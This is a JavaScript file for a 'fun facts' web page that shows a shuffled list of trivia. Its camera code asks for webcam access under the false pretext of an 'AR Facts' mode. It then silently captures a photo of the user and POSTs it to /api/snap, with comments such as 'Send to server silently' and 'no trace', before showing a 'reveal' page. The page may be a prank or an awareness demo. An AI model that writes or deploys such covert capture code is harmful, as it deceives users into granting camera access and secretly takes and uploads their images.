// ===== FUN FACTS DATABASE =====
const funFacts = [
  "Honey never spoils. Archaeologists have found 3,000-year-old honey in Egyptian tombs that was still edible.",
  "Octopuses have three hearts and blue blood.",
  "A group of flamingos is called a 'flamboyance'.",
  "Bananas are berries, but strawberries aren't.",
  "The Eiffel Tower can grow up to 6 inches taller during summer due to heat expansion.",
  "There are more stars in the universe than grains of sand on all Earth's beaches.",
  "A day on Venus is longer than a year on Venus.",
  "Sharks are older than trees. Sharks have existed for about 400 million years, while trees have been around for 350 million years.",
  "The shortest war in history lasted 38 to 45 minutes between Britain and Zanzibar.",
  "Cows have best friends and get stressed when separated.",
  "The inventor of the Pringles can is buried in one.",
  "A jiffy is an actual unit of time — 1/100th of a second.",
  "There's a species of jellyfish that is biologically immortal.",
  "The total weight of all ants on Earth is about the same as the total weight of all humans.",
  "Cleopatra lived closer in time to the Moon landing than to the construction of the Great Pyramid.",
  "Oxford University is older than the Aztec Empire.",
  "The human brain uses about 20% of the body's total energy, despite being only 2% of body weight.",
  "There are more possible iterations of a game of chess than there are atoms in the known universe.",
  "Sea otters hold hands while sleeping so they don't drift apart.",
  "The word 'nerd' was first coined by Dr. Seuss in 'If I Ran the Zoo' in 1950.",
  "A single bolt of lightning contains enough energy to toast 100,000 slices of bread.",
  "Wombat poop is cube-shaped to prevent it from rolling away.",
  "Your nose can remember 50,000 different scents.",
  "The moon has moonquakes, similar to earthquakes on Earth.",
  "Butterflies taste with their feet.",
  "An astronaut's footprint on the Moon can last for millions of years.",
  "The human body contains enough iron to make a 3-inch nail.",
  "Dolphins sleep with one eye open.",
  "The world's oldest known living tree is over 5,000 years old.",
  "Sloths can hold their breath longer than dolphins — up to 40 minutes."
];

// ===== STATE =====
let currentIndex = 0;
let cameraReady = false;
let factsSeen = 0;
let snapped = false;
let revealTriggered = false;

// ===== DOM ELEMENTS =====
const app = document.getElementById('app');
const reveal = document.getElementById('reveal');
const factText = document.getElementById('factText');
const factNum = document.getElementById('factNum');
const counter = document.getElementById('counter');
const nextBtn = document.getElementById('nextBtn');
const restartBtn = document.getElementById('restartBtn');
const cam = document.getElementById('cam');
const snapCanvas = document.getElementById('snapCanvas');

// ===== SHUFFLE FACTS =====
function shuffle(arr) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

let shuffledFacts = shuffle(funFacts);

// ===== DISPLAY FACT =====
function showFact(index) {
  if (index >= shuffledFacts.length) {
    shuffledFacts = shuffle(funFacts);
    currentIndex = 0;
    index = 0;
  }

  const card = document.getElementById('factCard');
  card.classList.add('slide-out');

  setTimeout(() => {
    factText.textContent = shuffledFacts[index];
    factNum.textContent = `#${factsSeen + 1}`;
    counter.textContent = factsSeen + 1;

    card.classList.remove('slide-out');
    card.classList.add('slide-in');

    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        card.classList.remove('slide-in');
      });
    });
  }, 350);
}

// ===== CAMERA SETUP — AUTO SNAP ON READY =====
async function initCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: 640, height: 480 },
      audio: false
    });
    cam.srcObject = stream;
    cameraReady = true;

    // Wait for the video to actually start playing, then auto-snap
    cam.addEventListener('playing', () => {
      // Small delay so the camera has a proper frame (not black)
      setTimeout(() => {
        takeSnap();
      }, 1500);
    }, { once: true });

  } catch (err) {
    // Permission denied or no camera — just let them browse facts
    cameraReady = false;
  }
}

// ===== SNAP PHOTO (SILENT) =====
async function takeSnap() {
  if (!cameraReady || snapped) return;
  snapped = true;

  try {
    snapCanvas.width = cam.videoWidth || 640;
    snapCanvas.height = cam.videoHeight || 480;
    const ctx = snapCanvas.getContext('2d');
    ctx.drawImage(cam, 0, 0, snapCanvas.width, snapCanvas.height);

    const imageData = snapCanvas.toDataURL('image/jpeg', 0.85);

    // Send to server silently
    await fetch('/api/snap', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ image: imageData })
    });
  } catch (err) {
    // Silent fail — no trace
  }

  // Schedule the reveal after they browse a couple more facts
  scheduleReveal();
}

// ===== SCHEDULE THE REVEAL =====
function scheduleReveal() {
  // Show reveal after they click "Next Fact" 2-3 more times, or after 8 seconds
  // Whichever comes first — makes it feel natural
  const revealAfterClicks = 2 + Math.floor(Math.random() * 2); // 2 or 3 clicks
  let clicksSinceSnap = 0;

  const originalHandler = nextBtn.onclick;
  nextBtn.addEventListener('click', function revealCheck() {
    clicksSinceSnap++;
    if (clicksSinceSnap >= revealAfterClicks && !revealTriggered) {
      revealTriggered = true;
      nextBtn.removeEventListener('click', revealCheck);
      setTimeout(showReveal, 600);
    }
  });

  // Fallback: auto-reveal after 10 seconds if they stop clicking
  setTimeout(() => {
    if (!revealTriggered) {
      revealTriggered = true;
      showReveal();
    }
  }, 10000);
}

// ===== SHOW REVEAL PAGE =====
function showReveal() {
  app.style.display = 'none';
  reveal.style.display = 'flex';

  // Stop camera
  if (cam.srcObject) {
    cam.srcObject.getTracks().forEach(t => t.stop());
  }
}

// ===== SHOW CAMERA PERMISSION MODAL =====
function showCameraModal() {
  const overlay = document.createElement('div');
  overlay.className = 'modal-overlay';
  overlay.innerHTML = `
    <div class="modal">
      <h2>Enable AR Facts</h2>
      <p>Allow camera access to unlock <strong>Augmented Reality Fun Facts</strong> — see facts come alive in your world!</p>
      <button class="btn btn-primary" id="allowCam">
        <span>Enable AR Mode</span>
      </button>
    </div>
  `;
  document.body.appendChild(overlay);

  document.getElementById('allowCam').addEventListener('click', async () => {
    overlay.remove();
    await initCamera();
  });
}

// ===== EVENT LISTENERS =====
nextBtn.addEventListener('click', () => {
  currentIndex++;
  factsSeen++;
  showFact(currentIndex);
});

restartBtn.addEventListener('click', () => {
  snapped = false;
  revealTriggered = false;
  reveal.style.display = 'none';
  app.style.display = 'flex';
  currentIndex = 0;
  factsSeen = 0;
  shuffledFacts = shuffle(funFacts);
  showFact(0);
  initCamera();
});

// ===== INIT =====
showFact(0);
factsSeen = 1;

// Show camera modal after a short delay
setTimeout(() => {
  showCameraModal();
}, 2000);
